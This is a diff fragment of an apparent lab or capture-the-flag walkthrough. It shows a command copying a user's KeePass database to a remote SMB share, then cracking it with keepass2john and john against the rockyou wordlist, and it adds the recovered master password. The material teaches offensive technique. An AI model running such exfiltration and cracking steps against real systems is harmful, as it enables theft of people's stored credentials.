@@ -147,6 +147,8 @@ copy C:\Users\kohsuke\Documents\CEH.kdbx \\10.10.14.13\share\CEH.kdbx
 ```bash
 keepass2john CEH.kdbx > keepass.hash
 john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+password moonshine1
 ```
 
 **Key entries found in KeePass:**
